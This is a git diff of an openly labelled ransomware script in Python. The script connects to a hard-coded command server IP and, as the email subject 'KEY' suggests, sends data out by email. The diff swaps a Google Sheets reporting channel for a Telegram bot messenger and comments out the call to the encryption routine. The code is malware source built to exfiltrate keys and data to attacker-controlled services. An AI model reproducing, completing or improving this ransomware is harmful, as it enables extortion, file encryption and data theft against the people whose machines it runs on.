@@ -2,6 +2,7 @@ import os
 import sys
 import psutil
 import smtplib
+import requests
 from time import sleep
 from pathlib import Path
 from email.mime.text import MIMEText
@@ -117,7 +118,7 @@ class EmailSender:
             msg = MIMEMultipart()
             msg['From'] = self.sender_email
             msg['To'] = receiver_email
-            msg['Subject'] = 'PNG'
+            msg['Subject'] = 'KEY'
             msg.attach(MIMEText(message, 'plain'))
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
@@ -129,59 +130,25 @@ class EmailSender:
             return False
 
 
-class GoogleSheet:
-    def __init__(self):
-        self.APISheet: dict = {
-            'KEY GOOGLE SHEET'
-        }
-        self.IDSheet = 'ID SHEET'
-        self.Service = self.CreateService()
-    
-    def CreateService(self):
-        try:
-            credentials = SA.Credentials.from_service_account_info(
-                self.APISheet,
-                scopes = ['https://www.googleapis.com/auth/spreadsheets']
-            )
-            service = build('sheets', 'v4', credentials=credentials)
-            return service
-        except:
-            return False
-    
-    def GetAllValues(self, Sheet: str = 'Sheet1') -> list:
-        result = self.Service.spreadsheets().values().get(
-            spreadsheetId = self.IDSheet,
-            range = Sheet
-        ).execute()
-        return result.get('values', [])
-    
-    def UpdateValuesInRange(self, values: list, range: str):
-        body = {
-            'values': values
-        }
-        result = self.Service.spreadsheets().values().update(
-            spreadsheetId=self.IDSheet,
-            range=range,
-            valueInputOption='RAW',
-            body=body
-        ).execute()
-        return result
-    
-    def UpdateValues(self, values, Sheet: str = 'Sheet1'):
-        Row = len(self.GetAllValues()) + 1
-        range_str = f'{Sheet}!A{Row}:F{Row}'
-        return self.UpdateValuesInRange(values, range_str)
-    
-    def UpdateColumn(self, values, Rowid, Sheet: str = 'Sheet1'):
-        range = f'{Sheet}!A{Rowid}:A'
-        return self.UpdateValuesInRange(values, range)
+class Telegram:
+    def __init__(self, token: str, chat_id: str) -> None:
+        self.url = 'https://api.telegram.org'
+        self.baseurl = f'{self.url}/bot{token}/'
+        self.chat_id = chat_id
 
-    
+    def SendMessage(self, text: str):
+        data = {
+            'chat_id': self.chat_id,
+            'text': text
+        }
+        try:
+            requests.post(f'{self.baseurl}sendMessage', data)
+        except: print('faild')
 
 if __name__ == '__main__':
     RanSomWare = Ransomware('171.249.211.29', 19100)
     RanSomWare.ConnectServer()
-    RanSomWare.Encrypted()
+    #RanSomWare.Encrypted()
     RanSomWare.Contact()
 
 
